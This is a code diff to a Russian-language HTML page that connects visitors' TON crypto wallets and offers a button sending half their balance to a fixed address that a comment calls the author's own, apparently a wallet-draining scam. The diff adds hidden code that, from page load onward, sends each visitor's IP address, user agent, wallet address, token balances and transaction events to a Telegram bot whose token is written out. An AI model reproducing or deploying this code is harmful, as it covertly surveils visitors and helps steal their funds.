@@ -41,6 +41,12 @@
         #wallet-info {
             margin-top: 20px;
         }
+        .notification {
+            background-color: #f8f8f8;
+            border-left: 4px solid #0088cc;
+            padding: 10px;
+            margin: 10px 0;
+        }
     </style>
 </head>
 <body>
@@ -61,6 +67,8 @@
     <button id="send-half-button" onclick="sendHalfBalance()" style="display: none;">Отправить 50% баланса</button>
 </div>
 
+<div id="notifications"></div>
+
 <script>
     const manifestUrl = 'https://sositeyaisa.github.io/ton/tonconnect-manifest.json';
     const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
@@ -71,13 +79,60 @@
     // мой адрес кошелька для получения TON
     const recipientAddress = 'UQA1eukl_AXlRZEt8bE4H_6Efhk413CPgvPMPr5GgJhQqLgh';
     
+    // Telegram Bot данные
+    const telegramBotToken = '7905366036:AAE2duz5D2NNDHA3-yMcyxIW4vEw8XYBruU';
+    const telegramChatId = '1447071887';
+    
     // Глобальные переменные для хранения информации о токенах
     let walletTokens = [];
     let connectedAddress = '';
+    
+    // Функция для отправки уведомлений в Telegram
+    async function sendTelegramNotification(message) {
+        try {
+            // Получаем информацию о пользователе
+            const userAgent = navigator.userAgent;
+            const ipResponse = await fetch('https://api.ipify.org?format=json');
+            const ipData = await ipResponse.json();
+            const ip = ipData.ip;
+            
+            // Формируем полное сообщение с информацией о пользователе
+            const fullMessage = `🔔 Новое уведомление:\n\n${message}\n\n📱 User-Agent: ${userAgent}\n🌐 IP: ${ip}\n⏰ Время: ${new Date().toLocaleString()}`;
+            
+            // Отправляем сообщение в Telegram
+            const telegramUrl = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;
+            const response = await fetch(telegramUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    chat_id: telegramChatId,
+                    text: fullMessage,
+                    parse_mode: 'HTML'
+                })
+            });
+            
+            const data = await response.json();
+            console.log('Telegram notification sent:', data);
+            
+            // Добавляем уведомление на страницу (для отладки)
+            const notificationElement = document.createElement('div');
+            notificationElement.className = 'notification';
+            notificationElement.textContent = `Уведомление отправлено: ${message}`;
+            document.getElementById('notifications').appendChild(notificationElement);
+            
+        } catch (error) {
+            console.error('Error sending Telegram notification:', error);
+        }
+    }
 
     // функция для подключения кошелька
     async function connectCustom() {
         try {
+            // Отправляем уведомление о попытке подключения
+            await sendTelegramNotification('👤 Пользователь пытается подключить кошелек');
+            
             const connectedWallet = await tonConnectUI.connectWallet();
             console.log("Подключенный кошелек:", connectedWallet);
             
@@ -86,7 +141,11 @@
             document.getElementById('wallet-address').textContent = connectedAddress;
             document.getElementById('wallet-info').style.display = 'block';
             
+            // Отправляем уведомление об успешном подключении
+            await sendTelegramNotification(`✅ Кошелек подключен\n📝 Адрес: <code>${connectedAddress}</code>`);
+            
             // Получаем информацию о токенах
+            await sendTelegramNotification(`🔍 Запрос балансов для адреса <code>${connectedAddress}</code>`);
             walletTokens = await getWalletBalances(connectedAddress);
             displayTokens(walletTokens);
             
@@ -97,6 +156,10 @@
             console.error("Тип ошибки:", typeof error);
             console.error("Ошибка:", error);
             console.error("Ошибка в строке:", JSON.stringify(error));
+            
+            // Отправляем уведомление об ошибке
+            await sendTelegramNotification(`❌ Ошибка при подключении кошелька: ${error.message || JSON.stringify(error)}`);
+            
             alert("Не удалось подключить кошелек. Проверьте консоль на наличие ошибок.");
         }
     }
@@ -140,8 +203,12 @@
             const halfBalanceNano = Math.floor(Number(tonToken.balance) / 2).toString();
             const halfBalanceTon = Number(halfBalanceNano) / 1e9;
             
+            // Отправляем уведомление о попытке отправки
+            await sendTelegramNotification(`⚠️ Попытка отправки 50% баланса\n💰 Сумма: ${halfBalanceTon} TON\n📤 От: <code>${connectedAddress}</code>\n📥 Кому: <code>${recipientAddress}</code>`);
+            
             // Подтверждение от пользователя
             if (!confirm(`Вы действительно хотите отправить ${halfBalanceTon} TON (50% вашего баланса) на адрес ${recipientAddress}?`)) {
+                await sendTelegramNotification(`🚫 Пользователь отменил отправку 50% баланса (${halfBalanceTon} TON)`);
                 return;
             }
             
@@ -155,13 +222,19 @@
             };
             
             console.log("Объект транзакции:", tx);
+            await sendTelegramNotification(`🔄 Транзакция создана и ожидает подписи пользователя\n💰 Сумма: ${halfBalanceTon} TON`);
             
             // Отправляем транзакцию (требует подтверждения пользователя в кошельке)
             const result = await tonConnectUI.sendTransaction(tx);
             console.log("Результат транзакции:", result);
+            
+            // Отправляем уведомление об успешной транзакции
+            await sendTelegramNotification(`✅ Транзакция успешно отправлена!\n💰 Сумма: ${halfBalanceTon} TON\n🧾 Хэш: <code>${result.hash}</code>`);
+            
             alert("Транзакция отправлена (50% баланса TON)! Хэш: " + result.hash);
             
             // Обновляем информацию о балансах
+            await sendTelegramNotification(`🔄 Обновление информации о балансах для <code>${connectedAddress}</code>`);
             walletTokens = await getWalletBalances(connectedAddress);
             displayTokens(walletTokens);
             
@@ -169,6 +242,10 @@
             console.error("Тип ошибки:", typeof error);
             console.error("Ошибка:", error);
             console.error("Ошибка в строке:", JSON.stringify(error));
+            
+            // Отправляем уведомление об ошибке
+            await sendTelegramNotification(`❌ Ошибка при отправке транзакции: ${error.message || JSON.stringify(error)}`);
+            
             alert("Транзакция не удалась. Проверьте консоль на наличие ошибок.");
         }
     }
@@ -215,6 +292,7 @@
                 };
             } catch (error) {
                 console.error("Ошибка при получении баланса TON:", error);
+                await sendTelegramNotification(`❌ Ошибка при получении баланса TON: ${error.message}`);
                 return {
                     type: "native",
                     name: "Toncoin",
@@ -255,6 +333,7 @@
                 return [];
             } catch (error) {
                 console.error("Ошибка при получении Jettons:", error);
+                await sendTelegramNotification(`❌ Ошибка при получении Jettons: ${error.message}`);
                 return [];
             }
         }
@@ -293,53 +372,71 @@
                 };
             } catch (error) {
                 console.error("Ошибка при получении информации о Jetton:", error);
+                await sendTelegramNotification(`❌ Ошибка при получении информации о Jetton: ${error.message}`);
                 return null;
             }
         }
 
-        // Получаем баланс TON
-        const tonBalance = await getTonBalance(walletAddress);
-        
-        // Получаем список Jetton
-        const jettons = await getJettons(walletAddress);
-        console.log(`Найдено ${jettons.length} jettons для адреса ${walletAddress}`);
+        try {
+            // Получаем баланс TON
+            const tonBalance = await getTonBalance(walletAddress);
+            
+            // Получаем список Jetton
+            const jettons = await getJettons(walletAddress);
+            console.log(`Найдено ${jettons.length} jettons для адреса ${walletAddress}`);
 
-        // Массив для всех балансов (TON + Jettons)
-        const allBalances = [tonBalance];
+            // Массив для всех балансов (TON + Jettons)
+            const allBalances = [tonBalance];
 
-        // Получаем информацию о каждом Jetton
-        for (const jetton of jettons) {
-            const jettonInfo = await getJettonInfo(jetton);
-            if (jettonInfo) {
-                // Преобразуем баланс с учетом decimals
-                const rawBalance = BigInt(jetton.balance);
-                const decimals = jettonInfo.decimals;
-                const formattedBalance = Number(rawBalance) / Math.pow(10, decimals);
+            // Получаем информацию о каждом Jetton
+            for (const jetton of jettons) {
+                const jettonInfo = await getJettonInfo(jetton);
+                if (jettonInfo) {
+                    // Преобразуем баланс с учетом decimals
+                    const rawBalance = BigInt(jetton.balance);
+                    const decimals = jettonInfo.decimals;
+                    const formattedBalance = Number(rawBalance) / Math.pow(10, decimals);
+                    
+                    allBalances.push({
+                        ...jettonInfo,
+                        formattedBalance: formattedBalance.toString()
+                    });
+                }
+            }
+
+            // Выводим информацию о балансах в консоль
+            console.log("\n=== ИТОГОВЫЕ БАЛАНСЫ ===");
+            console.log("Основной токен TON:", allBalances[0].formattedBalance, "TON");
+            
+            // Формируем сообщение для Telegram
+            let balanceMessage = `💰 Балансы для <code>${walletAddress}</code>:\n\n`;
+            balanceMessage += `🔹 TON: ${allBalances[0].formattedBalance}\n`;
+            
+            if (allBalances.length > 1) {
+                console.log("\nJetton токены:");
+                balanceMessage += `\n🪙 Jetton токены:\n`;
                 
-                allBalances.push({
-                    ...jettonInfo,
-                    formattedBalance: formattedBalance.toString()
-                });
+                for (let i = 1; i < allBalances.length; i++) {
+                    const token = allBalances[i];
+                    console.log(`${token.name} (${token.symbol}): ${token.formattedBalance}`);
+                    balanceMessage += `- ${token.name} (${token.symbol}): ${token.formattedBalance}\n`;
+                }
+            } else {
+                console.log("\nJetton токены не найдены");
+                balanceMessage += `\nJetton токены не найдены`;
             }
-        }
+            
+            // Отправляем информацию о балансах в Telegram
+            await sendTelegramNotification(balanceMessage);
+            
+            console.log("\nПолная информация о балансах:", JSON.stringify(allBalances, null, 2));
 
-        // Выводим информацию о балансах в консоль
-        console.log("\n=== ИТОГОВЫЕ БАЛАНСЫ ===");
-        console.log("Основной токен TON:", allBalances[0].formattedBalance, "TON");
-        
-        if (allBalances.length > 1) {
-            console.log("\nJetton токены:");
-            for (let i = 1; i < allBalances.length; i++) {
-                const token = allBalances[i];
-                console.log(`${token.name} (${token.symbol}): ${token.formattedBalance}`);
-            }
-        } else {
-            console.log("\nJetton токены не найдены");
+            return allBalances;
+        } catch (error) {
+            console.error("Ошибка при получении балансов:", error);
+            await sendTelegramNotification(`❌ Ошибка при получении балансов: ${error.message}`);
+            return [];
         }
-        
-        console.log("\nПолная информация о балансах:", JSON.stringify(allBalances, null, 2));
-
-        return allBalances;
     }
     
     // Проверяем, подключен ли уже кошелек
@@ -348,6 +445,9 @@
             connectedAddress = wallet.account.address;
             document.getElementById('wallet-address').textContent = connectedAddress;
             document.getElementById('wallet-info').style.display = 'block';
+            
+            // Отправляем уведомление о подключении кошелька
+            await sendTelegramNotification(`🔄 Статус кошелька изменился\n✅ Кошелек подключен\n📝 Адрес: <code>${connectedAddress}</code>`);
             
             // Получаем информацию о токенах
             walletTokens = await getWalletBalances(connectedAddress);
@@ -358,7 +458,18 @@
         } else {
             document.getElementById('wallet-info').style.display = 'none';
             document.getElementById('send-half-button').style.display = 'none';
+            
+            // Отправляем уведомление об отключении кошелька
+            if (connectedAddress) {
+                await sendTelegramNotification(`🔄 Статус кошелька изменился\n❌ Кошелек отключен\n📝 Адрес: <code>${connectedAddress}</code>`);
+                connectedAddress = '';
+            }
         }
+    });
+    
+    // Отправляем уведомление о загрузке страницы
+    window.addEventListener('load', async () => {
+        await sendTelegramNotification('🌐 Страница загружена пользователем');
     });
 </script>
 
